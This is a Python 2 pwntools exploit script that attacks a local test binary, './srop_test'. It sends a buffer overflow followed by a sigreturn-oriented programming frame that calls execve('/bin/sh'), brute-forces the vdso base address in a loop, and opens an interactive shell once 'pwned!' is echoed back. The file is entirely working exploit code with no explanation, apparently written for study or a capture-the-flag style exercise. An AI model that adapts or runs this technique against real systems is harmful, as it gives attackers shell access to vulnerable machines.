# -*- coding: utf-8 -*-
#!/usr/bin/env python2
from pwn import *
import random
context.log_level = 'debug'
context.arch = 'i386'

LOCAL = True

env = {'LD_PRELOAD':'libc.so.6'}


binsh_addr = 0x0804A024 #/bin/sh\0
bss_addr   = 0x0804A02E #.bss start
vdso_range = range(0xf7fd8000, 0xf7fd9000, 0x1000)


def main():
    global p
    if LOCAL:
        p = process('./srop_test')
    else:
    	p = remote('127.0.0.1',10001)

    global vdso_addr
    vdso_addr = random.choice(vdso_range)
    pl = "A" * 0x10c
    frame = SigreturnFrame(kernel='i386')
    frame.eax = 0xb
    frame.ebx = binsh_addr
    frame.ecx = 0
    frame.edx = 0
    frame.eip = vdso_addr + 0x416  #address of int 80h
    frame.esp = bss_addr  
    frame.ebp = bss_addr  
    frame.gs = 0x63
    frame.cs = 0x23
    frame.es = 0x2b
    frame.ds = 0x2b
    frame.ss = 0x2b
    ret_addr = vdso_addr + 0xbc0

    pl += p32(ret_addr) + str(frame)
    log.info("payload:{0}".format(pl))
    p.recvuntil("input something you want: \n")
    p.sendline(pl)

    sleep(1)
    p.sendline("echo pwned!")
    r = p.recvuntil("pwned!")
    if r != "pwned!":
        raise Exception("Failed!")
    return


if __name__ == '__main__':
    global p, vdso_addr
    i = 1
    while True:
        print "\nTry %d" % i
        try:
            main()
        except Exception as e:
            #print e
            p.close()
            i += 1
            continue
        print "vdso_addr: " + hex(vdso_addr)
        p.interactive()
        break
